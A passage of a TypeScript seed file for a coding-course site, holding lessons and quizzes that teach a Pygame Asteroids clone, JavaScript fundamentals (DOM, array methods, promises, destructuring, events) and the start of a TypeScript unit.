      `Pygame is a popular Python library for building 2D games, handling graphics, sound, input, and timing so you don't have to write that from scratch. In this project, you'll build a clone of the classic arcade game **Asteroids**: a ship that rotates and thrusts through space, dodging (and eventually destroying) asteroids drifting across the screen.\n\n## Installing Pygame\n\nPygame doesn't run inside this course's browser sandbox (it needs a real window to draw into), so for this project you'll write and run code locally with a real Python install.\n\n\`\`\`bash\npip install pygame\n\`\`\`\n\nVerify it installed correctly:\n\n\`\`\`\nimport pygame\nprint(pygame.ver)\n\`\`\`\n\n## Opening a window\n\nEvery Pygame program starts the same way: initialize the library, create a window (called a **surface**), and give it a title.\n\n\`\`\`\nimport pygame\n\npygame.init()\n\nWIDTH, HEIGHT = 800, 600\nscreen = pygame.display.set_mode((WIDTH, HEIGHT))\npygame.display.set_caption("Asteroids")\n\`\`\`\n\n- \`pygame.init()\` sets up every Pygame subsystem (display, sound, input) in one call.\n- \`pygame.display.set_mode((width, height))\` creates the actual window and returns a \`Surface\` you'll draw everything onto.\n- Nothing shows up yet, and the window will look "frozen"/unresponsive, that's because there's no loop keeping it open and processing events, which is exactly what the next lesson builds.\n\n> [!NOTE]\n> Running this script as-is will open a window and then immediately close it (or hang, depending on your OS), that's expected. A real window needs a **game loop** to stay open and respond to events, covered next.`
    ),
    quiz: {
      title: 'Pygame Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function creates the actual game window in Pygame?',
          options: ['pygame.init()', 'pygame.display.set_mode()', 'pygame.window.create()', 'pygame.new_screen()'],
          answer: 'pygame.display.set_mode()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'pygame.init() must be called before using most other Pygame features.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'pygame.display.set_mode() returns a ____ that you draw everything onto.',
          options: [],
          answer: 'surface',
        },
      ],
    },
  },
  {
    title: 'The Game Loop',
    content: lessonContent(
      'The Game Loop',
      `Every real-time game (not just Asteroids) is built around one core idea: the **game loop**, an endless cycle that processes input, updates state, and draws the next frame, over and over, many times per second.\n\n## The three phases\n\n\`\`\`\nimport pygame\n\npygame.init()\nscreen = pygame.display.set_mode((800, 600))\nclock = pygame.time.Clock()\n\nrunning = True\nwhile running:\n    # 1. Handle input/events\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    # 2. Update game state\n    # (nothing to update yet)\n\n    # 3. Draw the frame\n    screen.fill((10, 10, 30))  # dark space background\n    pygame.display.flip()\n\n    clock.tick(60)  # cap the loop at 60 frames per second\n\npygame.quit()\n\`\`\`\n\n- **Handle events**: \`pygame.event.get()\` drains the queue of everything that happened since the last frame (key presses, window close, etc). Without checking for \`pygame.QUIT\`, clicking the window's close button would do nothing.\n- **Update**: where you'll move the player, move asteroids, check collisions, this lesson's loop doesn't update anything yet, but the slot is there.\n- **Draw**: \`screen.fill(...)\` clears the previous frame to a solid color, then \`pygame.display.flip()\` actually shows everything you've drawn since the last flip, nothing is visible on screen until you call it.\n\n## Why clock.tick(60)?\n\n\`\`\`\nclock = pygame.time.Clock()\n# ... inside the loop:\nclock.tick(60)\n\`\`\`\n\n\`clock.tick(60)\` pauses just long enough to cap the loop at 60 iterations per second. Without it, the loop would run as fast as the CPU allows, hundreds or thousands of times per second, burning a full CPU core and making movement speed depend on how fast the computer happens to be. Capping the frame rate keeps the game's speed consistent across different machines.\n\n> [!WARNING]\n> Forgetting to call \`pygame.event.get()\` at all (not just skipping the QUIT check) makes the OS think the program has hung, since it isn't responding. Always drain the event queue every frame, even if you don't care about most of the events in it.`
    ),
    quiz: {
      title: 'Game Loop Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does clock.tick(60) do?',
          options: [
            'Draws 60 asteroids',
            'Caps the loop at 60 iterations per second',
            'Waits 60 seconds before starting',
            "Counts the player's score",
          ],
          answer: 'Caps the loop at 60 iterations per second',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'pygame.display.flip() must be called for anything drawn that frame to actually appear on screen.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: '____.event.get() drains the queue of input/window events since the last frame.',
          options: [],
          answer: 'pygame',
        },
      ],
    },
  },
  {
    title: 'The Player Class',
    content: lessonContent(
      'The Player Class',
      `With the loop running, it's time to put something on screen: the player's ship. This is also where **object-oriented programming** starts paying off, every asteroid and bullet you add later will follow the same pattern as this \`Player\` class.\n\n## Defining the class\n\n\`\`\`\nimport math\nimport pygame\n\nclass Player:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n        self.angle = 0          # degrees, 0 = facing up\n        self.speed = 0\n        self.radius = 15\n\n    def rotate(self, direction):\n        self.angle += direction * 4  # degrees per frame\n\n    def thrust(self):\n        self.speed = min(self.speed + 0.15, 6)  # accelerate, capped at a max speed\n\n    def update(self):\n        radians = math.radians(self.angle)\n        self.x += -math.sin(radians) * self.speed\n        self.y += math.cos(radians) * self.speed\n        self.speed *= 0.99  # gentle drag, so the ship coasts to a stop instead of forever\n\n    def draw(self, screen):\n        radians = math.radians(self.angle)\n        tip = (self.x + math.sin(radians) * self.radius, self.y - math.cos(radians) * self.radius)\n        left = (self.x - math.cos(radians) * self.radius * 0.6, self.y - math.sin(radians) * self.radius * 0.6)\n        right = (self.x + math.cos(radians) * self.radius * 0.6, self.y + math.sin(radians) * self.radius * 0.6)\n        pygame.draw.polygon(screen, (255, 255, 255), [tip, left, right])\n\`\`\`\n\n- \`__init__\` stores the ship's position (\`x\`, \`y\`), facing \`angle\`, current \`speed\`, and a \`radius\` you'll reuse for collision checks later.\n- \`rotate\` and \`thrust\` don't move the ship directly, they just change its angle/speed, \`update\` is what actually applies that to the position every frame, using basic trigonometry to convert an angle into an x/y direction.\n- \`draw\` computes three points (nose and two rear corners) from the ship's angle and position, then hands them to \`pygame.draw.polygon\` to render a simple triangle ship, classic Asteroids style.\n\n## Wiring it into the loop\n\n\`\`\`\nplayer = Player(400, 300)\n\nrunning = True\nwhile running:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_LEFT]:\n        player.rotate(-1)\n    if keys[pygame.K_RIGHT]:\n        player.rotate(1)\n    if keys[pygame.K_UP]:\n        player.thrust()\n\n    player.update()\n\n    screen.fill((10, 10, 30))\n    player.draw(screen)\n    pygame.display.flip()\n    clock.tick(60)\n\`\`\`\n\n\`pygame.key.get_pressed()\` returns the state of *every* key as a list-like object, checking \`keys[pygame.K_LEFT]\` each frame (rather than only reacting to individual key-down events) is what gives you smooth, held-down rotation and thrust instead of one press = one tiny nudge.\n\n> [!TIP]\n> Notice \`rotate\`/\`thrust\` only change \`angle\`/\`speed\`, while \`update\` is the only method that touches \`x\`/\`y\`. Separating "what changed" from "apply the change" like this makes it much easier to add things like screen-wrap or drag later without touching your input-handling code.`
    ),
    quiz: {
      title: 'Player Class Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which function lets you check every frame whether a key is currently held down?',
          options: ['pygame.event.get()', 'pygame.key.get_pressed()', 'pygame.key.was_pressed()', 'pygame.QUIT'],
          answer: 'pygame.key.get_pressed()',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "In the Player class, the rotate() and thrust() methods directly change the ship's x and y position.",
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'pygame.draw.____(screen, color, points) draws a shape from a list of (x, y) points, used here for the ship.',
          options: [],
          answer: 'polygon',
        },
      ],
    },
  },
  {
    title: 'Asteroids',
    content: lessonContent(
      'Asteroids',
      `A ship with nothing to dodge isn't much of a game. This lesson adds the asteroids themselves, and a screen-wrapping trick that both the ship and asteroids will share.\n\n## An Asteroid class\n\n\`\`\`\nimport random\nimport pygame\n\nclass Asteroid:\n    def __init__(self, x, y, size=40):\n        self.x = x\n        self.y = y\n        self.size = size\n        self.dx = random.uniform(-2, 2)\n        self.dy = random.uniform(-2, 2)\n\n    def update(self, width, height):\n        self.x = (self.x + self.dx) % width   # wrap around the left/right edges\n        self.y = (self.y + self.dy) % height  # wrap around the top/bottom edges\n\n    def draw(self, screen):\n        pygame.draw.circle(screen, (160, 160, 160), (int(self.x), int(self.y)), self.size, width=2)\n\`\`\`\n\n\`self.x % width\` is the key trick: Python's modulo operator wraps a value that goes past \`width\` back around to \`0\`, and a negative value back around to just under \`width\`. Applying it to both \`x\` and \`y\` every frame gives you the classic Asteroids screen-wrap for free, drift off the right edge, and you reappear on the left.\n\n## Spawning a field of them\n\n\`\`\`\ndef spawn_asteroids(count, width, height):\n    asteroids = []\n    for _ in range(count):\n        x = random.uniform(0, width)\n        y = random.uniform(0, height)\n        asteroids.append(Asteroid(x, y))\n    return asteroids\n\nasteroids = spawn_asteroids(5, 800, 600)\n\`\`\`\n\n## Updating and drawing all of them\n\n\`\`\`\nrunning = True\nwhile running:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    # ... player input handling from the previous lesson ...\n    player.update()\n\n    for asteroid in asteroids:\n        asteroid.update(800, 600)\n\n    screen.fill((10, 10, 30))\n    player.draw(screen)\n    for asteroid in asteroids:\n        asteroid.draw(screen)\n    pygame.display.flip()\n    clock.tick(60)\n\`\`\`\n\nLooping over \`asteroids\` twice, once to \`update()\` and once to \`draw()\`, is deliberate: every asteroid's position should be fully updated *before* any of them are drawn, otherwise you'd occasionally draw a half-updated frame (some asteroids moved, some not yet), causing visible stutter.\n\n> [!NOTE]\n> Right now the ship can fly straight through an asteroid with nothing happening, that's intentional for this lesson. Collision detection comes in a later lesson, once there's also something (a bullet) to collide with.`
    ),
    quiz: {
      title: 'Asteroids Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does self.x % width accomplish in Asteroid.update?',
          options: [
            'Slows the asteroid down over time',
            'Wraps the position back on-screen when it goes past an edge',
            'Rotates the asteroid',
            'Deletes the asteroid',
          ],
          answer: 'Wraps the position back on-screen when it goes past an edge',
        },
        {
          type: 'TRUE_FALSE',
          prompt: "The example loop updates every asteroid's position before drawing any of them, rather than updating and drawing one at a time.",
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'random.____(-2, 2) returns a random floating-point number between -2 and 2, used for each asteroid\'s drift speed.',
          options: [],
          answer: 'uniform',
        },
      ],
    },
  },
  {
    title: 'Shooting Bullets',
    content: lessonContent(
      'Shooting Bullets',
      `Dodging is only half of Asteroids, next you'll give the ship a way to fight back.\n\n## A Bullet class\n\n\`\`\`\nimport math\nimport pygame\n\nclass Bullet:\n    def __init__(self, x, y, angle):\n        self.x = x\n        self.y = y\n        radians = math.radians(angle)\n        self.dx = -math.sin(radians) * 10\n        self.dy = math.cos(radians) * -10\n        self.life = 60  # frames until it disappears, about 1 second at 60 FPS\n\n    def update(self):\n        self.x += self.dx\n        self.y += self.dy\n        self.life -= 1\n\n    def is_dead(self):\n        return self.life <= 0\n\n    def draw(self, screen):\n        pygame.draw.circle(screen, (255, 220, 100), (int(self.x), int(self.y)), 3)\n\`\`\`\n\nA bullet reuses the same angle-to-direction math as the ship's \`update\`, fired at a fixed speed (\`10\`) in whatever direction the ship was facing at the moment it fired. The \`life\` counter, decremented every frame, is what makes bullets disappear on their own instead of flying forever, \`is_dead()\` gives the rest of the code a clean way to ask "should this be removed yet?".\n\n## Firing on spacebar, with a cooldown\n\n\`\`\`\nbullets = []\ncooldown = 0\n\nrunning = True\nwhile running:\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n    keys = pygame.key.get_pressed()\n    if keys[pygame.K_SPACE] and cooldown == 0:\n        bullets.append(Bullet(player.x, player.y, player.angle))\n        cooldown = 15  # frames before you can fire again\n\n    if cooldown > 0:\n        cooldown -= 1\n\n    for bullet in bullets:\n        bullet.update()\n    bullets = [b for b in bullets if not b.is_dead()]\n\n    # ... player and asteroid updates from earlier lessons ...\n\n    screen.fill((10, 10, 30))\n    for bullet in bullets:\n        bullet.draw(screen)\n    pygame.display.flip()\n    clock.tick(60)\n\`\`\`\n\nTwo details are doing the real work here:\n\n- **The cooldown counter** stops holding spacebar from firing a new bullet every single frame (60 a second!), a fixed delay between shots is what makes it feel like a weapon instead of a hose.\n- **The list comprehension** \`[b for b in bullets if not b.is_dead()]\` rebuilds the \`bullets\` list containing only the ones still alive, this is the standard Python idiom for "remove items matching a condition" from a list, since you can't safely remove items from a list while iterating over it directly.\n\n> [!TIP]\n> This same "append when spawned, filter out when dead" pattern is exactly how you'll manage destroyed asteroids in the next lesson too, it's worth getting comfortable with here first.`
    ),
    quiz: {
      title: 'Bullets Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Why does the bullet-firing code track a cooldown counter?',
          options: [
            'To make bullets fly faster',
            'To prevent firing a new bullet on every single frame while spacebar is held',
            "To count the player's score",
            'To slow down the asteroids',
          ],
          answer: 'To prevent firing a new bullet on every single frame while spacebar is held',
        },
        {
          type: 'TRUE_FALSE',
          prompt: '[b for b in bullets if not b.is_dead()] creates a new list containing only the bullets that are still alive.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: "A bullet's ____ counter decreases by one every frame and determines when it disappears.",
          options: [],
          answer: 'life',
        },
      ],
    },
  },
  {
    title: 'Collisions, Score, and Game Over',
    content: lessonContent(
      'Collisions, Score, and Game Over',
      `With bullets and asteroids both on screen, it's time to make them actually interact: destroy asteroids you shoot, and end the game if one hits your ship.\n\n## Distance-based collision detection\n\n\`\`\`\nimport math\n\ndef distance(a, b):\n    return math.hypot(a.x - b.x, a.y - b.y)\n\`\`\`\n\nFor circular objects (ships, asteroids, bullets all drawn as circles/triangles with a \`radius\`), you don't need pixel-perfect collision, just check whether the distance between two centers is less than the sum of their radii:\n\n\`\`\`\ndef circles_collide(a, b):\n    return distance(a, b) < (a.radius + b.radius)\n\`\`\`\n\n## Bullets destroying asteroids\n\n\`\`\`\nscore = 0\n\nfor bullet in bullets:\n    for asteroid in asteroids:\n        if distance(bullet, asteroid) < asteroid.size:\n            bullet.life = 0        # mark the bullet dead so it gets filtered out\n            asteroid.hit = True    # mark this asteroid for removal\n            score += 100\n\nasteroids = [a for a in asteroids if not getattr(a, 'hit', False)]\nbullets = [b for b in bullets if not b.is_dead()]\n\`\`\`\n\nRather than removing items from \`asteroids\`/\`bullets\` in the middle of the nested loop (which corrupts the loop you're iterating over), the pattern is the same as the bullet-cleanup from the last lesson: mark things as "should be removed" first, then filter both lists once, after the collision checks are done.\n\n## Ending the game\n\n\`\`\`\ngame_over = False\n\nfor asteroid in asteroids:\n    if circles_collide(player, asteroid):\n        game_over = True\n\nif game_over:\n    font = pygame.font.SysFont(None, 64)\n    text = font.render("GAME OVER", True, (255, 60, 60))\n    screen.blit(text, (250, 260))\n\`\`\`\n\n\`pygame.font.SysFont(None, 64)\` loads the operating system's default font at size 64, \`.render(text, antialias, color)\` turns a string into a drawable \`Surface\`, and \`screen.blit(surface, position)\` is how you draw *any* image or rendered text onto the screen, it's the same function you'd use to draw a sprite image.\n\n> [!WARNING]\n> Once \`game_over\` is \`True\`, this snippet still keeps calling \`player.update()\`/\`asteroid.update()\` every frame unless you guard those calls too, remember to stop updating gameplay (but keep the event loop and drawing running) once the game has ended, otherwise the ship and asteroids keep moving invisibly under your "GAME OVER" text.`
    ),
    quiz: {
      title: 'Collisions & Game Over Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does screen.blit(surface, position) do?',
          options: [
            'Deletes a surface',
            'Draws one surface (an image or rendered text) onto another at a position',
            'Creates a new window',
            'Detects a collision',
          ],
          answer: 'Draws one surface (an image or rendered text) onto another at a position',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two circular objects are considered colliding when the distance between their centers is less than the sum of their radii.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'math.____(dx, dy) computes the straight-line distance between two points from their x and y differences.',
          options: [],
          answer: 'hypot',
        },
      ],
    },
  },
  {
    title: 'Final Project: Finish Your Asteroids Game',
    content: lessonContent(
      'Final Project: Finish Your Asteroids Game',
      `You now have every piece: a ship that rotates and thrusts, asteroids that drift and wrap around the screen, bullets with a cooldown, and collision detection that awards score and ends the game. Put it all together into a complete, playable game.\n\n## Requirements\n\n1. Combine the \`Player\`, \`Asteroid\`, and \`Bullet\` classes from earlier lessons into a single game with one game loop running at 60 FPS.\n2. Display the current score on screen every frame (reuse the \`pygame.font\`/\`screen.blit\` approach from the Collisions lesson).\n3. When an asteroid is destroyed by a bullet, split it into two smaller asteroids (half the \`size\`, each with a new random \`dx\`/\`dy\`) if it's above some minimum size, instead of just disappearing, this is the classic Asteroids "splitting" mechanic.\n4. Track a \`lives\` count (start at 3). When the player's ship collides with an asteroid, lose a life and respawn the ship at the center of the screen instead of ending immediately, only show "GAME OVER" once lives reach 0.\n5. Add a simple start screen ("Press SPACE to start") shown before the game loop begins updating gameplay.\n\n## Stretch goals\n\n- Make the ship briefly invulnerable (and visually flash) for a second after respawning, so it can't immediately lose another life to an asteroid it spawned on top of.\n- Add a basic sound effect for firing and for an asteroid being destroyed with \`pygame.mixer\`.\n- Increase difficulty over time by spawning additional asteroids the longer the player survives.\n\nSubmit a link to your finished project (a repo or gist) below, an instructor will review it before you can mark this lesson complete.`
    ),
    requiresSubmission: true,
  },
];

const jsLessons: SeedLesson[] = [
  {
    title: 'JavaScript in the Browser',
    content: lessonContent(
      'JavaScript in the Browser',
      `JavaScript is the one programming language that runs natively in every web browser, it's what makes pages interactive: reacting to clicks, fetching data, and updating content without a full page reload.\n\n## Your first JavaScript\n\n\`\`\`js\nconst name = 'Kodstigen';\nconsole.log('Hello, ' + name + '!');\n\nconst year = new Date().getFullYear();\nconsole.log('It is', year);\n\`\`\`\n\n## Declaring variables\n\n- \`const\` declares a variable that can't be reassigned after it's set, use it by default.\n- \`let\` declares a variable you *can* reassign later, use it when a value needs to change (like a counter).\n- \`var\` is the old way of declaring variables, from before \`let\`/\`const\` existed, you'll still see it in older code, but modern JavaScript avoids it.\n\n\`\`\`js\nlet xp = 0;\nxp = xp + 10; // fine, let can be reassigned\n\nconst name = 'Ada';\n// name = 'Grace'; ❌ this would throw an error, const can't be reassigned\n\`\`\`\n\n## The DOM\n\nIn a real page, JavaScript reads and modifies the **DOM** (Document Object Model), the live tree of elements your code can change:\n\n\`\`\`\nconst button = document.querySelector('#greet');\nbutton.addEventListener('click', () => {\n  document.querySelector('#out').textContent = 'Hello!';\n});\n\`\`\`\n\n*DOM code needs a real web page, so that block is read-only here, every other example in this course is runnable. Try the first one!*`
    ),
    quiz: {
      title: 'DOM Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does DOM stand for?',
          options: ['Data Object Model', 'Document Object Model', 'Digital Ordinance Map', 'Document Order Method'],
          answer: 'Document Object Model',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To react to a click you call element.____("click", handler).',
          options: [],
          answer: 'addEventListener',
        },
      ],
    },
  },
  {
    title: 'Arrays and Higher-Order Functions',
    content: lessonContent(
      'Arrays and Higher-Order Functions',
      `A **higher-order function** is simply a function that takes another function as an argument, or returns one. Arrays have several built-in higher-order functions that let you transform data without writing manual loops.\n\n\`\`\`js\nconst scores = [80, 92, 67, 100];\n\nconst passed = scores.filter(s => s >= 70);   // [80, 92, 100]\nconst doubled = scores.map(s => s * 2);\nconst total = scores.reduce((sum, s) => sum + s, 0);\n\nconsole.log('passed:', passed);\nconsole.log('doubled:', doubled);\nconsole.log('total:', total);\n\`\`\`\n\n## The three big ones\n\n- \`.filter(fn)\` builds a **new array** containing only the elements where \`fn\` returns \`true\`. Here, \`s => s >= 70\` keeps every score of 70 or above.\n- \`.map(fn)\` builds a **new array** by transforming every element. Here, \`s => s * 2\` doubles each score.\n- \`.reduce((acc, s) => ..., initialValue)\` combines every element into a single value. \`acc\` (the "accumulator") carries the running result forward from one element to the next, starting at \`initialValue\` (here, \`0\`).\n\n## Why not just use a for loop?\n\nYou could write the same logic with a \`for\` loop, but \`map\`/\`filter\`/\`reduce\` say *what* you want ("give me only the passing scores") instead of *how* to get it (looping, checking, pushing to a new array). None of them modify the original array, \`scores\` is untouched after all three calls, that predictability is a big part of why they're the backbone of modern JavaScript.`
    ),
    quiz: {
      title: 'Array Methods Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method returns a new array with only the elements that pass a test?',
          options: ['map', 'filter', 'reduce', 'forEach'],
          answer: 'filter',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Array.prototype.map mutates the original array.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Promises and fetch',
    content: lessonContent(
      'Promises and fetch',
      `Some operations, like a network request, take time and don't finish immediately. A **Promise** represents a value that will exist *later*, either successfully (**resolved**) or with an error (**rejected**). \`async\`/\`await\` lets you write that asynchronous code so it reads top-to-bottom, like ordinary synchronous code.\n\n\`\`\`js\nfunction loadCourse(id) {\n  // simulate a slow network request\n  return new Promise((resolve) => {\n    setTimeout(() => resolve({ id, title: 'Modern JavaScript' }), 500);\n  });\n}\n\nconsole.log('loading…');\nconst course = await loadCourse(42);\nconsole.log('loaded:', course.title);\n\`\`\`\n\n## Reading it\n\n- \`new Promise((resolve) => { ... })\` creates a Promise that starts out **pending**. Calling \`resolve(value)\` (usually once some async work finishes) moves it to **resolved** with that value.\n- \`await\` pauses the surrounding \`async\` function until the Promise resolves, then hands you the resolved value directly, no \`.then()\` callback needed.\n- Notice the console logs "loading…" *before* "loaded: ...", \`await\` doesn't freeze the whole page, it just pauses this function while other things could still happen.\n\n## fetch\n\nWith a real API you'd use \`fetch\` exactly the same way, it returns a Promise too:\n\n\`\`\`\nconst res = await fetch('/api/courses');\nif (!res.ok) throw new Error('Request failed');\nconst courses = await res.json();\n\`\`\`\n\n\`res.json()\` is itself asynchronous (parsing the response body takes a moment), so it needs its own \`await\` too.`
    ),
    quiz: {
      title: 'Async Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'Inside an async function you pause for a Promise with the ____ keyword.',
          options: [],
          answer: 'await',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does fetch() return?',
          options: ['A string', 'A Promise', 'A JSON object directly', 'An XMLHttpRequest'],
          answer: 'A Promise',
        },
      ],
    },
  },
  {
    title: 'Objects and Destructuring',
    content: lessonContent(
      'Objects and Destructuring',
      `Objects group related data together. **Destructuring** and the **spread operator** make working with them much less repetitive.\n\n\`\`\`js\nconst course = { title: 'Modern JavaScript Essentials', lessons: 6, published: true };\n\nconst { title, lessons } = course;\nconsole.log(title, lessons);\n\nconst student = { name: 'Ada', scores: [88, 92, 79] };\nconst { name, scores: [first, ...rest] } = student;\nconsole.log(name, first, rest);\n\nconst upgraded = { ...course, lessons: course.lessons + 1 };\nconsole.log(upgraded);\nconsole.log('original untouched:', course.lessons);\n\`\`\`\n\n## What's happening\n\n- \`const { title, lessons } = course\` pulls properties straight out of an object into variables.\n- \`...rest\` collects whatever is left over into a new array (or object).\n- \`{ ...course, lessons: 7 }\` **copies** every property from \`course\` into a brand-new object, then overrides \`lessons\`, the original object is never mutated.`
    ),
    quiz: {
      title: 'Objects & Destructuring Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does the spread operator do when used inside a new object literal, e.g. `{ ...course }`?',
          options: [
            'Deletes the original object',
            'Copies the properties of course into the new object',
            'Converts course to a string',
            'Freezes the original object',
          ],
          answer: 'Copies the properties of course into the new object',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'const { title } = course; is an example of object ____.',
          options: [],
          answer: 'destructuring',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Writing `{ ...course, lessons: 7 }` mutates the original course object.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Events and the DOM',
    content: lessonContent(
      'Events and the DOM',
      `Beyond reading the DOM, real pages react to what the user does, clicks, typing, submitting forms, through **events**.\n\n\`\`\`\nconst button = document.querySelector('#save');\nbutton.addEventListener('click', (event) => {\n  event.preventDefault();\n  console.log('Saved!');\n});\n\nconst input = document.querySelector('#name');\ninput.addEventListener('input', (event) => {\n  console.log('Typing:', event.target.value);\n});\n\`\`\`\n\n*This needs a real web page with a #save button and #name input, so it's read-only here, you'll wire up real event handlers in the final project.*\n\n## Key ideas\n\n- \`addEventListener(type, handler)\` attaches a handler for an event type (\`'click'\`, \`'input'\`, \`'submit'\`, and many more) without overwriting any handlers already attached.\n- The \`event\` object passed to your handler describes what happened, \`event.target\` is the element the event fired on, \`event.target.value\` reads an input's current text.\n- \`event.preventDefault()\` stops the browser's default behavior, most commonly used to stop a form from reloading the page on submit.`
    ),
    quiz: {
      title: 'Events Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which method attaches an event handler to an element?',
          options: ['element.onEvent()', 'element.addEventListener()', 'element.handle()', 'element.listen()'],
          answer: 'element.addEventListener()',
        },
        {
          type: 'FILL_BLANK',
          prompt: "Calling event.____() stops a form's default submit behavior.",
          options: [],
          answer: 'preventDefault',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'An element can have more than one event listener attached to it at the same time.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Interactive To-Do List',
    content: lessonContent(
      'Final Project: Interactive To-Do List',
      `Time to combine array methods, objects, and DOM events into a real interactive page.\n\n## Requirements\n\n1. Render a list of tasks from an array of objects, e.g. \`{ id, text, done }\`.\n2. Let the user add a new task through an input and button (or a form submit).\n3. Let the user toggle a task's done state and remove a task.\n4. Use \`map\`/\`filter\` to derive what gets rendered rather than mutating the DOM by hand everywhere.\n5. Persist the task list in \`localStorage\` so it survives a page reload.\n\n## Stretch goals\n\n- Add filter buttons for All / Active / Completed.\n- Allow editing a task's text inline.\n- Show a live count of remaining tasks.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const tsLessons: SeedLesson[] = [
  {
    title: 'Why TypeScript?',
    content: lessonContent(
      'Why TypeScript?',
      `TypeScript adds **static types** on top of JavaScript, the compiler checks that your code is internally consistent *before* it ever runs, catching whole categories of bugs that would otherwise only show up at runtime, in production, in front of a user.\n\n\`\`\`ts\nfunction greet(name: string): string {\n  return \`Hello, \${name}\`;\n}\n\nconsole.log(greet('Kodstigen'));\n\n// greet(42) ❌ the compiler rejects this before the code ever runs:\n// "Argument of type 'number' is not assignable to parameter of type 'string'"\n\`\`\`\n\n## What changed from JavaScript\n\n- \`name: string\` declares that the \`name\` parameter must be a string, pass anything else and the compiler stops you immediately, instead of the bug surfacing later as a confusing runtime error.\n- \`): string\` after the parameter list declares the function's **return type**, if the function body tried to \`return 42\` instead, that would be a compile error too.\n- Every valid JavaScript program is already valid TypeScript, you can add types gradually, file by file, instead of rewriting everything at once.\n\n## Compile time vs. runtime\n\nTypeScript types only exist while you're writing and compiling code, they're checked once, then stripped away entirely. The JavaScript that actually runs in a browser or Node.js has no idea types ever existed, this is why TypeScript can catch bugs early without slowing down the program itself.\n\n*Note: the playground runs TypeScript by stripping the types, full type checking happens in your editor and compiler.*`
    ),
    quiz: {
      title: 'TypeScript Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'TRUE_FALSE',
          prompt: 'TypeScript types are checked at compile time, not at runtime.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'TypeScript files typically use the file extension .____',
          options: [],
          answer: 'ts',
        },
      ],
    },
  },
  {
    title: 'Interfaces and Types',
    content: lessonContent(
      'Interfaces and Types',
      `As programs grow, describing the *shape* of your data becomes just as important as describing its logic. TypeScript gives you two main tools for that: **interfaces** and **type aliases**.\n\n\`\`\`ts\ninterface Course {\n  id: string;\n  title: string;\n  lessons: number;\n  published?: boolean; // optional\n}\n\ntype Role = 'STUDENT' | 'INSTRUCTOR' | 'ADMIN'; // union type\n\nfunction describe(course: Course, role: Role): string {\n  return \`\${role} viewing "\${course.title}" (\${course.lessons} lessons)\`;\n}\n\nconsole.log(describe({ id: 'c1', title: 'TypeScript from JavaScript', lessons: 12 }, 'STUDENT'));\n\`\`\`\n\n## Interfaces describe object shapes\n\n\`interface Course { ... }\` says: "a \`Course\` is an object with exactly these properties." Passing an object missing \`title\`, or with a \`lessons\` that's a string instead of a number, is a compile error. The \`?\` after \`published\` marks it **optional**, an object can be a valid \`Course\` with or without it.\n\n## Union types restrict the possible values\n\n\`type Role = 'STUDENT' | 'INSTRUCTOR' | 'ADMIN';\` means a \`Role\` can only ever be one of those three exact strings, nothing else. Try passing \`'ADMINISTRATOR'\` where a \`Role\` is expected, and the compiler catches the typo immediately, something plain JavaScript could never do.\n\n> [!NOTE]\n> \`interface\` and \`type\` overlap a lot in practice, a common convention is: use \`interface\` for the shape of objects, and \`type\` for unions, primitives, or anything an interface can't express.`
    ),
    quiz: {
      title: 'Types Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: "What does the ? in `published?: boolean` mean?",
          options: ['The property is nullable', 'The property is optional', 'The property is readonly', 'The property is private'],
          answer: 'The property is optional',
        },
        {
          type: 'MULTIPLE_CHOICE',
